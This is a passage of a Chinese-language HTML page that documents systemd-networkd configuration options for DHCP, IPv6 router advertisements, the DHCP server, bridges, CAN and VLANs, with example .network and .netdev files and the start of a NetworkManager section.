“<code>mac</code>“ 表示连接的MAC地址； “<code>duid</code>“ 表示一个符合RFC4361规范的客户端ID(也就是 IAID 与 DUID 的组合)； “<code>duid-only</code>“ 表示仅使用 DUID (可能与 RFC 规范不兼容，但某些场合需要这样做)。 默认值是 “<code>duid</code>“</p><h6 id="VendorClassIdentifier"><a href="#VendorClassIdentifier" class="headerlink" title="VendorClassIdentifier"></a>VendorClassIdentifier</h6><p>标识厂商类型与配置的厂商类标识符(DHCP Option 60)， 这是一个DHCP可选项。</p><h6 id="UserClass"><a href="#UserClass" class="headerlink" title="UserClass"></a>UserClass</h6><p>用于 DHCPv4 客户端标识用户或应用的类型(DHCP “User Class” 选项)。 此选项中包含的字符串表明此客户端是哪些用户类的成员。 每个类都有一个标识字符串，供DHCP服务对客户端进行分类。 此选项接受一个空白分隔的字符串列表。</p><h6 id="DUIDType"><a href="#DUIDType" class="headerlink" title="DUIDType"></a>DUIDType</h6><p>为此连接设置一个专用的 <code>DUIDType</code> 以覆盖全局默认值。参见 <a href="http://www.jinbuguo.com/systemd/networkd.conf.html#">networkd.conf(5)</a> 以了解可用值。</p><h6 id="DUIDRawData"><a href="#DUIDRawData" class="headerlink" title="DUIDRawData"></a>DUIDRawData</h6><p>为此连接设置一个专用的 <code>DUIDRawData</code> 以覆盖全局默认值。参见 <a href="http://www.jinbuguo.com/systemd/networkd.conf.html#">networkd.conf(5)</a> 以了解可用值。</p><h6 id="IAID"><a href="#IAID" class="headerlink" title="IAID"></a>IAID</h6><p>为此连接设置一个 DHCP IAID(Identity Association Identifier) ，一个 32-bit 无符号整数。</p><h6 id="RequestBroadcast"><a href="#RequestBroadcast" class="headerlink" title="RequestBroadcast"></a>RequestBroadcast</h6><p>要求DHCP服务器在完成配置IP地址之前使用广播消息。 对于不能接收原始包的网卡， 或者 在配置IP地址之前不能接收任何包的网卡来说，必须开启此选项。 另一方面， 对于广播包被屏蔽的网络来说，则必须关闭此选项。</p><h6 id="RouteMetric"><a href="#RouteMetric" class="headerlink" title="RouteMetric"></a>RouteMetric</h6><p>指定由DHCP分配的路由的 跃点数(一个正整数)。</p><h6 id="RouteTable-num"><a href="#RouteTable-num" class="headerlink" title="RouteTable=_num_"></a><code>RouteTable=_</code>num<code>_</code></h6><p>DHCP路由表标识符(一个 1 到 4294967295 之间的整数， 0 表示未设置)。 可以使用 <strong>ip route show table <em><code>num</code></em></strong> 查看路由表内容。</p><p>除非已经明确为此选项设置了一个正整数， 否则当与 <code>VRF=</code> 一起使用时，将会使用VRF的路由表。</p><h6 id="ListenPort"><a href="#ListenPort" class="headerlink" title="ListenPort"></a>ListenPort</h6><p>设置DHCP客户端的监听端口(客户端默认在UDP的68端口监听)。</p><h6 id="RapidCommit"><a href="#RapidCommit" class="headerlink" title="RapidCommit"></a>RapidCommit</h6><p>接受一个布尔值。 DHCPv6 客户端可以通过一种被称为”rapid commit”的快速两消息交换方式(solicit, reply)从 DHCPv6 服务器获得配置参数。 如果 DHCPv6 客户端与服务器都支持”rapid commit”选项， 那么将会使用快速两消息交换方式(solicit, reply)取代默认的四消息交换方式(solicit, advertise, request, reply)。 两消息交换方式提高了客户端配置速度，在网络负债较重的环境中很有意义。 详见 <a href="https://tools.ietf.org/html/rfc3315#section-17.2.1">RFC 3315</a> 文档。 默认值为 yes 。</p><h6 id="ForceDHCPv6PDOtherInformation"><a href="#ForceDHCPv6PDOtherInformation" class="headerlink" title="ForceDHCPv6PDOtherInformation"></a>ForceDHCPv6PDOtherInformation</h6><p>接受一个布尔值。 设为 yes 表示即使在路由通告(Router Advertisement)消息中设置了’Other information’位，也强制使用 DHCPv6 有状态模式。 默认情况下，当在路由通告(Router Advertisement)消息中仅设置了’Other information’位时， DHCPv6 将以无状态的两消息交换方式请求网络信息。但是在 <a href="https://tools.ietf.org/html/rfc7084">RFC 7084</a>(要求 WPD-4)规范中， 针对客户边缘(Customer Edge)路由器，此种默认行为发生了改变，使得即使在路由通告(Router Advertisement)消息中仅设置了’Other information’位， 也将请求有状态的 DHCPv6 前缀委派(Prefix Delegation)。 此选项就用于开启这种 CE(Customer Edge) 行为，否则无法自动区分’Other information’位的含义。 此选项的默认值是 no 。 当该网络设备用作 CE(Customer Edge) 路由器时(不需要委派前缀)，应该将此选项设为 yes 。</p><h5 id="10-IPv6AcceptRA"><a href="#10-IPv6AcceptRA" class="headerlink" title="10.IPv6AcceptRA"></a>10.IPv6AcceptRA</h5><p>“<code>[IPv6AcceptRA]</code>“ 用于配置IPv6路由通告(Router Advertisement)客户端。 仅在 [Network] 小节中的 <code>IPv6AcceptRA=</code> 选项已开启的情况下有意义。</p><h6 id="UseDNS-1"><a href="#UseDNS-1" class="headerlink" title="UseDNS"></a>UseDNS</h6><p>默认值 yes 表示从IPv6路由通告消息中接收DNS服务器的设置， 同时无视任何本地的静态DNS配置。</p><p>这相当于 <a href="http://man7.org/linux/man-pages/man5/resolv.conf.5.html">resolv.conf(5)</a> 中 <code>nameserver</code> 的作用。</p><h6 id="UseDomains-1"><a href="#UseDomains-1" class="headerlink" title="UseDomains"></a>UseDomains</h6><p>接受一个布尔值。或特殊值 “<code>route</code>“ 。 yes 表示将从IPv6路由通告消息中接收到的域用于此连接的DNS搜索域。 在效果上与 <code>Domains=</code> 中不带 “<code>~</code>“ 前缀的值类似。 “<code>route</code>“ 表示仅将从IPv6路由通告消息中接收到的域用于路由DNS查询(而不用于搜索)， 在效果上与 <code>Domains=</code> 中带有 “<code>~</code>“ 前缀的值类似。 默认值为 no</p><p>建议仅在可信任网络环境中才能将此选项设为 yes 。 因为它会影响到所有主机名的解析，特别是单标签主机名(不含”.”的主机名)的解析。 一般来说，仅设置”路由域”而不设置”搜索域”是安全的， 因为这样做不会影响到单标签主机名(不含”.”的主机名)的解析。</p><p>当设为 yes 时，此选项相当于 <a href="http://man7.org/linux/man-pages/man5/resolv.conf.5.html">resolv.conf(5)</a> 中 <code>nameserver</code> 的作用。</p><h6 id="RouteTable-num-1"><a href="#RouteTable-num-1" class="headerlink" title="RouteTable&#x3D;num"></a>RouteTable&#x3D;<em><code>num</code></em></h6><p>在路由通告中接收到的路由表编号(一个 1 到 4294967295 之间的整数， 0 表示未设置)。 可以使用 <strong>ip route show table <em><code>num</code></em></strong> 命令显示表内容。</p><h5 id="11-DHCPServer"><a href="#11-DHCPServer" class="headerlink" title="11.DHCPServer"></a>11.DHCPServer</h5><p>“<code>[DHCPServer]</code>“ 小节用于配置 DHCPv4 服务端。 仅在 [Network] 小节中的 <code>DHCPServer=</code> 选项已开启的情况下有意义。</p><h6 id="PoolOffset-PoolSize"><a href="#PoolOffset-PoolSize" class="headerlink" title="PoolOffset&#x3D;, PoolSize"></a>PoolOffset&#x3D;<code>, </code>PoolSize</h6><p>配置可用于动态分配的IP地址池。 地址池必须与DHCP服务器的IP地址位于同一子网内， 并且不得包含子网地址与广播地址。 <code>PoolOffset=</code> 用于设置地址池的起点，用相对于子网起点的偏移量表示。 若设为”0”则表示使用默认值。 <code>PoolSize=</code> 用于设置地址池的长度(也就是包含的IP地址数量)。 若设为”0”则表示使用默认值。 默认情况下，地址池的起点位于子网地址之后的第一个地址， 终点位于广播地址前面的那个地址，也就是包含了全部的可分配地址。 如果地址池中正好包含了DHCP服务器自身的地址(默认情况就是这样)也没关系， 这个地址不会被分配给DHCP客户端。</p><h6 id="DefaultLeaseTimeSec-MaxLeaseTimeSec"><a href="#DefaultLeaseTimeSec-MaxLeaseTimeSec" class="headerlink" title="DefaultLeaseTimeSec&#x3D;, MaxLeaseTimeSec"></a>DefaultLeaseTimeSec&#x3D;<code>, </code>MaxLeaseTimeSec</h6><p>设置传递给DHCP客户端的 默认租期(默认”1h”)与最大租期(默认”12h”)， 可以使用 “min”, “h”, “days”, “weeks”, “months” 后缀。 默认租期用于客户端未指定租约时长的情况。 如果客户端指定的租约时长超过了此处设置的最大值， 那么将自动限制为此处设置的最大值。 如果租约经常变化， 那么应该设置较小的值； 反之， 为了降低DHCP所占用的网络流量， 应该设置较大的值。</p><h6 id="EmitDNS-DNS"><a href="#EmitDNS-DNS" class="headerlink" title="EmitDNS&#x3D;, DNS"></a>EmitDNS&#x3D;<code>, </code>DNS</h6><p>接受一个布尔值。 设置是否要给DHCP客户端传递DNS服务器信息。 默认值 “<code>yes</code>“ 表示要传递。 而 <code>DNS=</code> 则用于设置一个 要传递的DNS服务器列表(以IPv4地址表示)。 如果 <code>EmitDNS=yes</code> 但同时并未设置 <code>DNS=</code> 的值， 那么将自动使用从”上级连接”中获得的DNS服务器列表。 所谓”上级连接”是指 系统中优先级最高的默认路由。 注意： (1)不会从本机的 <code>/etc/resolv.conf</code> 中提取DNS服务器。 (2)并不通知DHCP客户端”上级连接”的DNS变化。 为了确保客户端能够及时知晓”上级连接”的DNS变化， 应该减小 <code>MaxLeaseTimeSec=</code> 的值。</p><h6 id="EmitNTP-NTP"><a href="#EmitNTP-NTP" class="headerlink" title="EmitNTP&#x3D;, NTP"></a>EmitNTP&#x3D;<code>, </code>NTP</h6><p>与 <code>EmitDNS=</code> 和 <code>DNS=</code> 完全相同， 不同之处 仅在于 这两个选项针对的是 NTP时间服务器。</p><h6 id="EmitRouter"><a href="#EmitRouter" class="headerlink" title="EmitRouter"></a>EmitRouter</h6><p>与 <code>EmitDNS=</code> 完全相同， 不同之处仅在于 这两个选项针对的是 路由器。</p><h6 id="EmitTimezone-Timezone"><a href="#EmitTimezone-Timezone" class="headerlink" title="EmitTimezone,Timezone"></a>EmitTimezone,Timezone</h6><p>接受一个布尔值。 设置是否要给DHCP客户端传递时区信息。默认值 “<code>yes</code>“ 表示要传递。 而 <code>Timezone=</code> 则用于设置一个要传递的时区字符串， 例如 “<code>Asia/Shanghai</code>“(中华民国中原时区) 或 “<code>UTC</code>“(世界统一时间) 或 “<code>PRC</code>“(中华人民共和国)。 若未明确设置 <code>Timezone=</code> 的值， 那么将使用本机的时区，也就是 <code>/etc/localtime</code> 软连接。</p><h5 id="12-IPv6PrefixDelegation"><a href="#12-IPv6PrefixDelegation" class="headerlink" title="12.IPv6PrefixDelegation"></a>12.IPv6PrefixDelegation</h5><p>“<code>[IPv6PrefixDelegation]</code>“ 小节用于配置如何发送IPv6路由通告消息(IPv6 Router Advertisement)以及是否用作路由器角色， 仅在 [Network] 小节中的 <code>IPv6PrefixDelegation=</code> 选项已开启的情况下有意义。 IPv6 网络前缀定义在一个或多个 “<code>[IPv6Prefix]</code>“ 小节中。</p><h6 id="Managed-OtherInformation"><a href="#Managed-OtherInformation" class="headerlink" title="Managed,OtherInformation"></a>Managed,OtherInformation</h6><p>此二选项 都只接受一个布尔值。 <code>Managed=yes</code> 表示通过 DHCPv6 服务器来获取 IPv6 地址。 <code>OtherInformation=yes</code> 表示通过 DHCPv6 服务器来获取其他信息。 此二选项的默认值都是 “<code>no</code>“ ，表示完全不使用 DHCPv6 服务器。</p><h6 id="RouterLifetimeSec"><a href="#RouterLifetimeSec" class="headerlink" title="RouterLifetimeSec"></a>RouterLifetimeSec</h6><p>设置此连接作为 IPv6 路由器的时长(单位是秒)。 如果设置了此选项，那么将会在路由通告消息中将该网络连接宣布为一个 IPv6 路由器。 若未设置此选项，则表示本机不是一个路由器。</p><h6 id="RouterPreference"><a href="#RouterPreference" class="headerlink" title="RouterPreference"></a>RouterPreference</h6><p>设置 IPv6 路由的优先权，此选项仅在 <code>RouterLifetimeSec=</code> 非零的时候有意义。 可设为 “<code>high</code>“, “<code>medium</code>“(默认值), “<code>low</code>“ 之一。 详见 <a href="https://tools.ietf.org/html/rfc4191">RFC 4191</a> 文档。</p><h6 id="EmitDNS-DNS-1"><a href="#EmitDNS-DNS-1" class="headerlink" title="EmitDNS,DNS"></a>EmitDNS,DNS</h6><p>DNS&#x3D;<code>用于设置当</code>EmitDNS&#x3D;yes<code>时， 通过路由通告(Router Advertisement)消息分发的递归DNS服务器的 IPv6 地址列表。 如果</code>DNS&#x3D;<code> 的值为空， 那么 DNS 服务器将从 &quot;</code>[Network]<code>&quot; 小节读取。如果 &quot;</code>[Network]<code>&quot; 小节也不包含任何 DNS 服务器， 那么，将使用来自于上行链路中优先级最高的默认路由的 DNS 服务器。 如果 </code>EmitDNS&#x3D;no<code>， 那么将不会在路由通告(Router Advertisement)消息中发送DNS服务器信息。</code>EmitDNS&#x3D;&#96; 的默认值是 yes 。</p><h6 id="EmitDomains-Domains"><a href="#EmitDomains-Domains" class="headerlink" title="EmitDomains,Domains"></a>EmitDomains,Domains</h6><p>Domains&#x3D;<code>用于设置当</code>EmitDomains&#x3D;yes<code>时， 通过路由通告(Router Advertisement)消息分发的DNS搜索域列表。 如果</code>Domains&#x3D;<code> 的值为空，那么DNS搜索域将从 &quot;</code>[Network]<code>&quot; 小节读取。如果 &quot;</code>[Network]<code>&quot; 小节也不包含任何DNS搜索域， 那么，将使用来自于上行链路中优先级最高的默认路由的DNS搜索域。 如果 </code>EmitDomains&#x3D;no<code>， 那么将不会在路由通告(Router Advertisement)消息中发送DNS搜索域信息。</code>EmitDomains&#x3D;&#96; 的默认值是 yes 。</p><h6 id="DNSLifetimeSec"><a href="#DNSLifetimeSec" class="headerlink" title="DNSLifetimeSec"></a>DNSLifetimeSec</h6><p>设置 <code>DNS=</code> 与 <code>Domains=</code> 两个选项中设置的列表的有效期(单位是秒)。</p><h5 id="13-IPv6Prefix"><a href="#13-IPv6Prefix" class="headerlink" title="13.IPv6Prefix"></a>13.IPv6Prefix</h5><p>可以设置多个 “<code>[IPv6Prefix]</code>“ 小节， 每个小节都包含一个通过路由通告声明的 IPv6 前缀。详见 <a href="https://tools.ietf.org/html/rfc4861">RFC 4861</a> 文档。</p><p>AddressAutoconfiguration&#x3D;<code>, </code>OnLink<br>此二选项都只接受一个布尔值。 <code>AddressAutoconfiguration=yes</code> 表示允许自动配置带有此前缀的 IPv6 地址。 <code>OnLink=yes</code> 表示此前缀可用于在线(OnLink)检测。 此二选项的默认值都是 “<code>yes</code>“ 以简化配置难度。</p><p>Prefix<br>设置用于分发的 IPv6 前缀。 值是一个形如 “<code>IPv6地址/前缀长度</code>“ 的字符串。 因为每个 IPv6 前缀的有效期、是否允许自动配置地址、在线(OnLink)状态可能各不相同， 所以需要使用多个 “<code>[IPv6Prefix]</code>“ 小节来分别配置多个不同的 IPv6 前缀。</p><p>PreferredLifetimeSec&#x3D;<code>, </code>ValidLifetimeSec<br>PreferredLifetimeSec&#x3D;<code>表示该IPv6前缀的首选生存期时长(单位是秒)，默认值是 604800 秒(一个星期)。</code>ValidLifetimeSec&#x3D;&#96; 表示该IPv6前缀的有效生存期时长(单位是秒)，默认值是 2592000 秒(30天)。</p><h5 id="14-Bridge"><a href="#14-Bridge" class="headerlink" title="14.Bridge"></a>14.Bridge</h5><p>可在 “<code>[Bridge]</code>“ 小节中使用的选项如下：</p><h6 id="UnicastFlood"><a href="#UnicastFlood" class="headerlink" title="UnicastFlood"></a>UnicastFlood</h6><p>接受一个布尔值。 设为 yes 表示网桥应该通过该端口转发没有FDB项并且目标MAC地址未知的流量。 若未设置此选项，则使用内核的默认值。</p><h6 id="MulticastToUnicast"><a href="#MulticastToUnicast" class="headerlink" title="MulticastToUnicast"></a>MulticastToUnicast</h6><p>接受一个布尔值。设置是否开启运行在网桥多播侦听功能之上的多播到单播。 这意味着单播副本只传递给对它感兴趣的主机。 若未设置此选项，则使用内核的默认值。</p><h6 id="HairPin"><a href="#HairPin" class="headerlink" title="HairPin"></a>HairPin</h6><p>接受一个布尔值。 设置网桥是否可以将从该端口接收到的流量仍然通过该端口返还发送回去。 若未设置此选项， 则使用内核的默认值。</p><h6 id="UseBPDU"><a href="#UseBPDU" class="headerlink" title="UseBPDU"></a>UseBPDU</h6><p>接受一个布尔值。设置该网桥端口是否处理 STP BPDU(Bridge Protocol Data Units)。 若未设置此选项，则使用内核的默认值。</p><h6 id="FastLeave"><a href="#FastLeave" class="headerlink" title="FastLeave"></a>FastLeave</h6><p>接受一个布尔值。 设置是否允许在该端口接收到”IGMP Leave”消息后立即停止此端口上的多播。 此选项仅与IGMP嗅探一起使用才有意义。若未设置此选项，则使用内核的默认值。</p><h6 id="AllowPortToBeRoot"><a href="#AllowPortToBeRoot" class="headerlink" title="AllowPortToBeRoot"></a>AllowPortToBeRoot</h6><p>接受一个布尔值。设置是否允许该端口成为根端口(Root Port)，也就是与根桥(Root Bridge)直接相连或路径最短的端口。 此选项仅在网桥启用了STP(生成树协议)的情况下才有意义。 若未设置此选项，则使用内核的默认值。</p><h6 id="Cost"><a href="#Cost" class="headerlink" title="Cost"></a>Cost</h6><p>设置该端口发送数据包的”cost”。 一个网桥上的不同端口可能有不同的速度， 速度越快的端口，其”cost”值也越低。 因此，”cost”值可用于决定使用哪个端口。 取值范围是 1 到 65535 之间的一个整数。</p><h6 id="Priority-1"><a href="#Priority-1" class="headerlink" title="Priority"></a>Priority</h6><p>设置该接口的”优先级”。 网桥上的每一个端口都可以拥有一个”优先级”，用于确定优先使用哪一个连接。 较小的数值表示优先级较高(更优先使用)。 可设为 0 到 63 之间的整数。 此选项没有默认值，意味着默认使用内核的值(默认为 32)。</p><h5 id="15-BridgeFDB"><a href="#15-BridgeFDB" class="headerlink" title="15.BridgeFDB"></a>15.BridgeFDB</h5><p>“<code>[BridgeFDB]</code>“ 小节 用于管理网桥端口的流量转发表。 可以通过设置多个 “<code>[BridgeFDB]</code>“ 小节 来配置多个静态MAC表项。</p><h6 id="MACAddress-3"><a href="#MACAddress-3" class="headerlink" title="MACAddress"></a>MACAddress</h6><p>这是一个必须设置的选项， 含义与 “<code>[Link]</code>“ 小节中的同名选项相同。</p><h6 id="VLANId"><a href="#VLANId" class="headerlink" title="VLANId"></a>VLANId</h6><p>新的静态MAC表项的”VLAN ID”。 若未设置， 则不添加任何”VLAN ID”信息。</p><h5 id="16-CAN"><a href="#16-CAN" class="headerlink" title="16.CAN"></a>16.CAN</h5><p>管理控制器区域网络(Controller Area Network)(CAN 总线)。 可在 “<code>[CAN]</code>“ 小节中使用的选项如下：</p><h6 id="BitRate"><a href="#BitRate" class="headerlink" title="BitRate"></a>BitRate</h6><p>CAN设备的比特率(位&#x2F;秒)。 可以使用以1000为基准的 SI 后缀(K, M)。</p><h6 id="SamplePoint"><a href="#SamplePoint" class="headerlink" title="SamplePoint"></a>SamplePoint</h6><p>可选的采样点小数点百分比(例如 “<code>75%</code>“, “<code>87.5%</code>“)。</p><h6 id="RestartSec"><a href="#RestartSec" class="headerlink" title="RestartSec"></a>RestartSec</h6><p>自动重启延迟。 设为非零值表示在总线断开的情况下，延迟指定的时长后自动触发CAN控制器重启。 可以使用表示时间单位的 “<code>s</code>“, “<code>ms</code>“, “<code>us</code>“ 后缀。设为 “<code>infinity</code>“ 或 “<code>0</code>“ 表示关闭自动重启。 默认为关闭自动重启。</p><h5 id="17-BridgeVLAN"><a href="#17-BridgeVLAN" class="headerlink" title="17.BridgeVLAN"></a>17.BridgeVLAN</h5><p>“<code>[BridgeVLAN]</code>“ 小节用于管理网桥端口的 VLAN ID 配置。 可以通过设置多个 “<code>[BridgeVLAN]</code>“ 小节来配置多个 VLAN 项。 此小节仅在 <a href="http://www.jinbuguo.com/systemd/systemd.netdev.html#">systemd.netdev(5)</a> 中 “<code>[Bridge]</code>“ 小节下的 <code>VLANFiltering=</code> 选项被开启时才有意义。</p><h6 id="VLAN-1"><a href="#VLAN-1" class="headerlink" title="VLAN"></a>VLAN</h6><p>可以设为一个单独的 ID 或 “M-N” 格式表示的ID范围。表示在此端口上启用的 VLAN ID 。 有效的 VLAN ID 范围是 1~4094 。</p><h6 id="EgressUntagged"><a href="#EgressUntagged" class="headerlink" title="EgressUntagged"></a>EgressUntagged</h6><p>可以设为一个单独的 ID 或 “M-N” 格式表示的ID范围。 此处设置的 VLAN ID 将被用于在出口上 untag 帧。 设置此选项将会隐含的使用 <code>VLAN=</code> 并将 VLAN ID 同时应用于进入的帧。</p><h6 id="PVID"><a href="#PVID" class="headerlink" title="PVID"></a>PVID</h6><p>为所有进入的 untag 帧设置 Port VLAN ID 。此选项仅可使用一次。 设置此选项将会隐含的使用 <code>VLAN=</code> 并将 VLAN ID 同时应用于进入的帧。</p><h4 id="3-实例"><a href="#3-实例" class="headerlink" title="3.实例"></a>3.实例</h4><h6 id="1-指定网卡配置静态ip"><a href="#1-指定网卡配置静态ip" class="headerlink" title="1.指定网卡配置静态ip"></a>1.指定网卡配置静态ip</h6><p>&#x2F;etc&#x2F;systemd&#x2F;network&#x2F;50-static.network</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Match]</span><br><span class="line">Name=enp2s0</span><br><span class="line"></span><br><span class="line">[Network]</span><br><span class="line">Address=192.168.0.15/24</span><br><span class="line">Gateway=192.168.0.1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># /etc/systemd/network/80-dhcp.network</span><br><span class="line">[Match]</span><br><span class="line">Name=en*</span><br><span class="line"></span><br><span class="line">[Network]</span><br><span class="line">DHCP=yes</span><br></pre></td></tr></table></figure><h6 id="2-桥接网卡"><a href="#2-桥接网卡" class="headerlink" title="2.桥接网卡"></a>2.桥接网卡</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># /etc/systemd/network/25-bridge-static.network</span><br><span class="line">[Match]</span><br><span class="line">Name=bridge0</span><br><span class="line"></span><br><span class="line">[Network]</span><br><span class="line">Address=192.168.0.15/24</span><br><span class="line">Gateway=192.168.0.1</span><br><span class="line">DNS=192.168.0.1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># /etc/systemd/network/25-bridge-slave-interface-1.network</span><br><span class="line">[Match]</span><br><span class="line">Name=enp2s0</span><br><span class="line"></span><br><span class="line">[Network]</span><br><span class="line">Bridge=bridge0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># /etc/systemd/network/25-bridge-slave-interface-2.network</span><br><span class="line">[Match]</span><br><span class="line">Name=wlp3s0</span><br><span class="line"></span><br><span class="line">[Network]</span><br><span class="line">Bridge=bridge0</span><br></pre></td></tr></table></figure><p>创建一个网桥，并将 “<code>enp2s0</code>“ 与 “<code>wlp3s0</code>“ 添加进去。 同时为网桥配置一个静态地址，静态设置的网关也将被用作默认路由。 设置的DNS服务器将会被添加到全局DNS服务器列表中。</p><p>&#x2F;etc&#x2F;systemd&#x2F;network&#x2F;20-bridge-slave-interface-vlan.network<br>[Match]<br>Name&#x3D;enp2s0</p><p>[Network]<br>Bridge&#x3D;bridge0</p><p>[BridgeVLAN]<br>VLAN&#x3D;1-32<br>PVID&#x3D;42<br>EgressUntagged&#x3D;42</p><p>[BridgeVLAN]<br>VLAN&#x3D;100-200</p><p>[BridgeVLAN]<br>EgressUntagged&#x3D;300-400</p><p>本例的设置覆盖了上例中对 “<code>enp2s0</code>“ 接口的配置，为其开启了 VLAN 功能： (1) VLAN ID 等于 1-32, 42, 100-400 的包将被直接发出， (2) VLAN ID 等于 42, 300-400 的包将被去掉 tag 标记之后再发出。 (3) 接收到的无 tag 标记的包将被指定一个 VLAN ID 等于 42 的值。</p><h6 id="3-隧道配置"><a href="#3-隧道配置" class="headerlink" title="3.隧道配置"></a>3.隧道配置</h6><p>&#x2F;etc&#x2F;systemd&#x2F;network&#x2F;25-tunnels.network<br>[Match]<br>Name&#x3D;ens1</p><p>[Network]<br>Tunnel&#x3D;ipip-tun<br>Tunnel&#x3D;sit-tun<br>Tunnel&#x3D;gre-tun<br>Tunnel&#x3D;vti-tun</p><p>&#x2F;etc&#x2F;systemd&#x2F;network&#x2F;25-tunnel-ipip.netdev<br>[NetDev]<br>Name&#x3D;ipip-tun<br>Kind&#x3D;ipip</p><p>&#x2F;etc&#x2F;systemd&#x2F;network&#x2F;25-tunnel-sit.netdev<br>[NetDev]<br>Name&#x3D;sit-tun<br>Kind&#x3D;sit</p><p>&#x2F;etc&#x2F;systemd&#x2F;network&#x2F;25-tunnel-gre.netdev<br>[NetDev]<br>Name&#x3D;gre-tun<br>Kind&#x3D;gre</p><p>&#x2F;etc&#x2F;systemd&#x2F;network&#x2F;25-tunnel-vti.netdev<br>[NetDev]<br>Name&#x3D;vti-tun<br>Kind&#x3D;vti</p><p>这将启动 “<code>ens1</code>“ 接口，并使用此接口创建一个 IPIP 隧道、 一个 SIT 隧道、一个 GRE 隧道、一个 VTI 隧道。</p><h6 id="4-多网卡绑定"><a href="#4-多网卡绑定" class="headerlink" title="4.多网卡绑定"></a>4.多网卡绑定</h6><p>&#x2F;etc&#x2F;systemd&#x2F;network&#x2F;30-bond1.network<br>[Match]<br>Name&#x3D;bond1</p><p>[Network]<br>DHCP&#x3D;ipv6</p><p>&#x2F;etc&#x2F;systemd&#x2F;network&#x2F;30-bond1.netdev<br>[NetDev]<br>Name&#x3D;bond1<br>Kind&#x3D;bond</p><p>&#x2F;etc&#x2F;systemd&#x2F;network&#x2F;30-bond1-dev1.network<br>[Match]<br>MACAddress&#x3D;52:54:00:e9:64:41</p><p>[Network]<br>Bond&#x3D;bond1</p><p>&#x2F;etc&#x2F;systemd&#x2F;network&#x2F;30-bond1-dev2.network<br>[Match]<br>MACAddress&#x3D;52:54:00:e9:64:42</p><p>[Network]<br>Bond&#x3D;bond1</p><p>创建一个 “<code>bond1</code>“ 设备， 并将两个MAC地址为 52:54:00:e9:64:41 与 52:54:00:e9:64:42 的网卡添加进去。 同时使用 DHCPv6 来获取地址。</p><h6 id="5-虚拟路由转发-VRF"><a href="#5-虚拟路由转发-VRF" class="headerlink" title="5.虚拟路由转发(VRF)"></a>5.虚拟路由转发(VRF)</h6><p>将 “<code>bond1</code>“ 添加到 VRF 主接口 “<code>vrf1</code>“ 上。 这将把此接口上生成的路由重定向到创建 VFR 过程中定义的路由表中。 注意，Linux-4.8 之前的内核不会根据 VFR 路由表重定向流量，除非专门添加了特定的IP规则。</p><p>&#x2F;etc&#x2F;systemd&#x2F;network&#x2F;25-vrf.network<br>[Match]<br>Name&#x3D;bond1</p><p>[Network]<br>VRF&#x3D;vrf1</p><h6 id="6-MacVTap"><a href="#6-MacVTap" class="headerlink" title="6.MacVTap"></a>6.MacVTap</h6><p>启动 “<code>macvtap-test</code>“ 接口， 并将其附着到 “<code>enp0s25</code>“ 上。</p><p>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;network&#x2F;25-macvtap.network<br>[Match]<br>Name&#x3D;enp0s25</p><p>[Network]<br>MACVTAP&#x3D;macvtap-test</p><h2 id="2-NetworkManager"><a href="#2-NetworkManager" class="headerlink" title="2.NetworkManager"></a>2.NetworkManager</h2><h3 id="1-描述-1"><a href="#1-描述-1" class="headerlink" title="1.描述"></a>1.描述</h3><p><a href="https://networkmanager.dev/">NetworkManager</a> 是一个为系统提供检测和配置功能以便自动连接到网络的程序。NetworkManager 的功能对无线和有线网络都很有用。对于无线网络，NetworkManager 偏好已知的无线网络，并能切换到最可靠的网络。能感知 NetworkManager 的应用程序可以切换在线和离线模式。比起无线连接，NetworkManager 更偏好有线连接，且支持调制解调器连接和一些类型的 VPN。NetworkManager 最初由 Red Hat 开发，现在由 <a href="https://wiki.archlinuxcn.org/wiki/GNOME" title="GNOME">GNOME</a> 管理。</p><h4 id="1-移动网络支持"><a href="#1-移动网络支持" class="headerlink" title="1.移动网络支持"></a>1.移动网络支持</h4><p><a href="https://wiki.archlinuxcn.org/wiki/%E5%AE%89%E8%A3%85" title="安装">安装</a> <a href="https://archlinux.org/packages/?name=modemmanager">modemmanager</a>包 和 <a href="https://archlinux.org/packages/?name=usb_modeswitch">usb_modeswitch</a>包。然后<a href="https://wiki.archlinuxcn.org/wiki/%E5%90%AF%E7%94%A8" title="启用">启用</a>并<a href="https://wiki.archlinuxcn.org/wiki/%E5%90%AF%E5%8A%A8" title="启动">启动</a> <code>ModemManager.service</code>。<br>可能需要<a href="https://wiki.archlinuxcn.org/wiki/Help:%E9%98%85%E8%AF%BB#%E6%8E%A7%E5%88%B6_systemd_%E5%8D%95%E5%85%83" title="Help:阅读">重新启动</a> <code>NetworkManager.service</code> 才能使其检测 ModemManager。重新启动后，重新插入调制解调器应该就可以识别了。</p><p>从前端界面(例如 <a href="https://archlinux.org/packages/?name=nm-connection-editor">nm-connection-editor</a>包)添加连接并将连接类型选择为 broadband,选择 ISP 和套餐, <a href="https://archlinux.org/packages/?name=mobile-broadband-provider-info">mobile-broadband-provider-info</a>包 会自动填入 <a href="https://en.wikipedia.org/wiki/Access_Point_Name" title="wikipedia:Access Point Name">APN</a> 和其它设置。</p><h4 id="2-PPPoE-DSL-支持"><a href="#2-PPPoE-DSL-支持" class="headerlink" title="2.PPPoE &#x2F; DSL 支持"></a>2.PPPoE &#x2F; DSL 支持</h4><p><a href="https://wiki.archlinuxcn.org/wiki/%E5%AE%89%E8%A3%85" 